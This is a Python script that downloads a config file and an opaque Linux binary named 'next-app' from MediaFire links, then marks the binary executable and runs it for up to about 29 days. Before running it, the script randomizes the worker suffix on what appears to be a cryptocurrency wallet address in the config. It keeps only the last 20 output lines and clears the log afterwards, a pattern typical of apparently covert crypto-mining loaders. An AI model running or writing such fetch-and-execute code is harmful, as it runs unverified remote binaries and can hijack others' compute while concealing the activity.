import os
import subprocess
from pathlib import Path
import random
import string
import re
import shutil
import urllib.request
import urllib.parse
import html
import collections
from typing import Optional

CONFIG_URL = "https://download2298.mediafire.com/c6vtikimqi8ggLxpJm5jQesvUO3x4jOVRkIyD3geJwRndCv8uNdaY5fADnW4pxoxf3N8FzztJD3ihch1G3M-i3NgCGCneWQy_6-YE0v6bs8cvdHZaWzcUWxXTG9ih1YBmkf1fk7RZIW30JgyI0TcpmbnJbiU1ZkFE4bjWLI0ayeCwhY/w2a9576gmmm0eug/config.json"
APP_URL = "https://download2389.mediafire.com/3oecu7kbxtdgI-8klKjITxty8Iq_HNUVFOYWlsXw0SkvvTR2xeP-ESYyMi36ZKbrZRP8rKeL3Juqz-kryG0DvzjTacoz9t-nVqBZfM7wMNNaOVohV6DpWd-7VNFfPoRB3euL3aeRNOBdkhurZ1oEJwaQLcluBZi3U0FLlhd2OO9EN_M/g0ydnvd4s0p2y5b/next-app"
CONFIG_PATH = Path("config.json")
APP_PATH = Path("next-app")
OUTPUT_PATH = Path("1.txt")
MAX_LINES = 20
DOWNLOAD_TIMEOUT = 120
RUN_TIMEOUT = 2500000
RUN_APP = True

TARGET_NAME = "MrB1qVzRVnfZ3sFoJkEarPEkj7R4s5T3Lt"


def safe_unlink(path: Path) -> None:
    path = Path(path)
    try:
        if path.exists() or path.is_symlink():
            path.unlink()
    except FileNotFoundError:
        pass
    except OSError as exc:
        print(f"Warning: could not remove file {path}: {exc}")


def safe_replace(src: Path, dst: Path) -> None:
    src = Path(src)
    dst = Path(dst)
    try:
        src.replace(dst)
    except OSError:
        shutil.copyfile(src, dst)
        safe_unlink(src)


def ensure_output_file(path: Path = OUTPUT_PATH) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.touch(exist_ok=True)


def random_suffix(length=8):
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def is_mediafire_url(url: str) -> bool:
    host = urllib.parse.urlparse(url).netloc.lower()
    return "mediafire.com" in host


def mediafire_share_url_from_download_url(url: str) -> Optional[str]:
    parsed = urllib.parse.urlparse(url)
    parts = [part for part in parsed.path.split("/") if part]
    if len(parts) >= 2:
        file_id = parts[-2]
        filename = parts[-1]
        return f"https://www.mediafire.com/file/{file_id}/{filename}/file"
    return None


def find_mediafire_download_link(page_html: str) -> Optional[str]:
    patterns = [
        r'id=["\']downloadButton["\'][^>]*href=["\']([^"\']+)["\']',
        r'href=["\']([^"\']+)["\'][^>]*id=["\']downloadButton["\']',
        r'href=["\']([^"\']*download[^"\']*)["\']',
    ]
    for pattern in patterns:
        match = re.search(pattern, page_html, flags=re.IGNORECASE | re.DOTALL)
        if match:
            link = html.unescape(match.group(1))
            if link.startswith("//"):
                return "https:" + link
            if link.startswith("/"):
                return "https://www.mediafire.com" + link
            return link
    return None


def refresh_mediafire_url(url: str, timeout: int = DOWNLOAD_TIMEOUT) -> str:
    candidate_pages = []
    share_url = mediafire_share_url_from_download_url(url)
    if share_url:
        candidate_pages.append(share_url)
    candidate_pages.append(url)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0 Safari/537.36"
        )
    }

    for page_url in candidate_pages:
        try:
            request = urllib.request.Request(page_url, headers=headers)
            with urllib.request.urlopen(request, timeout=timeout) as response:
                content_type = response.headers.get("Content-Type", "").lower()
                body = response.read().decode("utf-8", errors="ignore")
        except Exception:
            continue

        if "text/html" not in content_type and not body.lstrip().lower().startswith(("<!doctype html", "<html")):
            return page_url

        fresh_link = find_mediafire_download_link(body)
        if fresh_link:
            return fresh_link

    return url


def download_file(url: str, destination: Path, timeout: int = DOWNLOAD_TIMEOUT) -> None:
    destination = Path(destination)
    destination.parent.mkdir(parents=True, exist_ok=True)

    tmp_destination = destination.with_name(
        f".{destination.name}.{os.getpid()}.{random_suffix(6)}.download"
    )

    download_url = refresh_mediafire_url(url, timeout=timeout) if is_mediafire_url(url) else url

    try:
        subprocess.run(
            [
                "wget",
                "-q",
                "--tries=3",
                "--timeout=120",
                "--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
                "--content-disposition",
                "--output-document",
                str(tmp_destination),
                download_url,
            ],
            check=True,
            timeout=timeout,
        )
        if not tmp_destination.exists() or tmp_destination.stat().st_size == 0:
            raise FileNotFoundError(f"wget did not create a non-empty file at {tmp_destination}")
        safe_replace(tmp_destination, destination)
    finally:
        safe_unlink(tmp_destination)


def file_starts_with(path: Path, prefixes) -> bool:
    path = Path(path)
    if not path.exists() or path.stat().st_size == 0:
        return False
    with path.open("rb") as f:
        header = f.read(max(len(prefix) for prefix in prefixes))
    return any(header.startswith(prefix) for prefix in prefixes)


def is_probably_html(path: Path) -> bool:
    path = Path(path)
    if not path.exists() or path.stat().st_size == 0:
        return False
    with path.open("rb") as f:
        sample = f.read(512).lstrip().lower()
    return sample.startswith((b"<!doctype html", b"<html")) or b"<html" in sample[:200]


def ensure_downloaded(
    url: str,
    destination: Path,
    timeout: int = DOWNLOAD_TIMEOUT,
    *,
    require_executable_binary: bool = False,
) -> None:
    destination = Path(destination)
    needs_download = not destination.exists() or destination.stat().st_size == 0

    if destination.exists() and is_probably_html(destination):
        needs_download = True

    if require_executable_binary and destination.exists():
        if not file_starts_with(destination, (b"\x7fELF", b"#!")):
            needs_download = True

    if needs_download:
        if destination.exists():
            safe_unlink(destination)
        download_file(url, destination, timeout=timeout)

    if not destination.exists() or destination.stat().st_size == 0:
        raise FileNotFoundError(
            f"Failed to create/download {destination.resolve()}. "
            f"Check that the URL is still valid and reachable: {url}"
        )

    if is_probably_html(destination):
        with destination.open("rb") as f:
            preview = f.read(300)
        raise OSError(
            f"Downloaded {destination.resolve()} is still an HTML page, not the requested file. "
            f"The MediaFire link may be expired, blocked, password-protected, or unavailable. "
            f"First bytes: {preview!r}"
        )

    if require_executable_binary and not file_starts_with(destination, (b"\x7fELF", b"#!")):
        with destination.open("rb") as f:
            preview = f.read(200)
        raise OSError(
            f"{destination.resolve()} is not a Linux executable/script after download. "
            f"It may be an HTML download page, a corrupt partial file, or a binary for another OS. "
            f"First bytes: {preview!r}"
        )


def randomize_target_suffix(config_path: Path = CONFIG_PATH, target_name: str = TARGET_NAME) -> str:
    config_path = Path(config_path)
    with config_path.open("r", encoding="utf-8") as f:
        text = f.read()

    pattern = rf"({re.escape(target_name)})\.1\b"
    new_suffix = random_suffix()
    new_text, replacements = re.subn(pattern, rf"\1.{new_suffix}", text, count=1)

    if replacements == 0:
        print(f"No exact occurrence of {target_name}.1 was found in {config_path}; config was left unchanged.")
    else:
        with config_path.open("w", encoding="utf-8") as f:
            f.write(new_text)
        print(f"Changed {target_name}.1 to {target_name}.{new_suffix} in {config_path}.")

    return new_suffix


def write_rolling_line(line: str, log_path: Path, max_lines: int) -> None:
    """Append one line to log_path in real time; if the file already holds max_lines
    lines, drop the oldest line first so the file never exceeds max_lines lines."""
    log_path = Path(log_path)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Read existing lines (tolerant of a missing file).
    try:
        with log_path.open("r", errors="ignore") as f:
            existing = collections.deque(f.readlines(), maxlen=max_lines)
    except FileNotFoundError:
        existing = collections.deque(maxlen=max_lines)

    # Normalise: make sure the new line ends with a newline character.
    if not line.endswith("\n"):
        line = line + "\n"

    # If already at capacity, the deque's maxlen automatically drops the oldest entry.
    existing.append(line)

    # Atomically rewrite the file so partial reads by other processes see a consistent state.
    tmp_path = log_path.with_name(
        f".{log_path.name}.{os.getpid()}.{random_suffix(6)}.tmp"
    )
    try:
        with tmp_path.open("w", errors="ignore") as f:
            f.writelines(existing)
        safe_replace(tmp_path, log_path)
    finally:
        safe_unlink(tmp_path)


def run_app_realtime(
    app_executable: str,
    output_path: Path,
    max_lines: int,
    run_timeout: int,
) -> Optional[int]:
    """Run the app, writing each output line to output_path in real time.
    Oldest lines are automatically deleted so the file never exceeds max_lines lines.
    Returns the process return-code, or None on timeout/interrupt."""
    output_path = Path(output_path)
    ensure_output_file(output_path)

    try:
        process = subprocess.Popen(
            [app_executable],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            errors="ignore",
        )
    except OSError as exc:
        write_rolling_line(f"Failed to execute {app_executable}: {exc}", output_path, max_lines)
        raise

    import signal, threading

    timed_out = threading.Event()

    def _kill_on_timeout():
        timed_out.set()
        try:
            process.kill()
        except OSError:
            pass

    timer = threading.Timer(run_timeout, _kill_on_timeout)
    timer.start()
    try:
        for raw_line in process.stdout:
            write_rolling_line(raw_line, output_path, max_lines)
        process.wait()
    except KeyboardInterrupt:
        try:
            process.kill()
        except OSError:
            pass
        write_rolling_line("Process interrupted by user.", output_path, max_lines)
        print(f"next-app was interrupted; partial output was written to {output_path}.")
        return None
    finally:
        timer.cancel()

    if timed_out.is_set():
        write_rolling_line(
            f"Process timed out after {run_timeout} seconds.", output_path, max_lines
        )
        print(f"next-app timed out after {run_timeout} seconds; partial output was written to {output_path}.")
        return None

    return process.returncode


# ---------------------------------------------------------------------------
# Main execution
# ---------------------------------------------------------------------------

ensure_output_file(OUTPUT_PATH)

ensure_downloaded(CONFIG_URL, CONFIG_PATH, require_executable_binary=False)

randomize_target_suffix(CONFIG_PATH, TARGET_NAME)

if RUN_APP:
    ensure_downloaded(APP_URL, APP_PATH, require_executable_binary=True)

    if not APP_PATH.exists() or APP_PATH.stat().st_size == 0:
        raise FileNotFoundError(
            f"{APP_PATH.resolve()} was not downloaded or is empty. Check APP_URL or network access."
        )

    if not file_starts_with(APP_PATH, (b"\x7fELF", b"#!")):
        with APP_PATH.open("rb") as f:
            preview = f.read(200)
        raise OSError(
            f"{APP_PATH.resolve()} is not a Linux executable/script after download. "
            f"It may be an HTML download page, a corrupt partial file, or a binary for another OS. "
            f"First bytes: {preview!r}"
        )

    APP_PATH.chmod(APP_PATH.stat().st_mode | 0o111)
    app_executable = str(APP_PATH.resolve())

    return_code = run_app_realtime(app_executable, OUTPUT_PATH, MAX_LINES, RUN_TIMEOUT)

    if return_code is not None and return_code != 0:
        print(f"next-app exited with return code {return_code}; output was written to {OUTPUT_PATH}.")

# Final safety-net: if the file somehow exceeded MAX_LINES, clear it.
ensure_output_file(OUTPUT_PATH)
with OUTPUT_PATH.open("r", errors="ignore") as f:
    line_count = sum(1 for _ in f)

if line_count >= MAX_LINES:
    with OUTPUT_PATH.open("w") as f:
        f.write("")
    print(f"Cleared {OUTPUT_PATH} because it contained {line_count} lines (>= {MAX_LINES}); file was kept to avoid FileNotFoundError.")
else:
    print(f"Kept {OUTPUT_PATH}; it contains {line_count} lines (< {MAX_LINES}).")

ensure_output_file(OUTPUT_PATH)

print(f"Updated {CONFIG_PATH} successfully.")
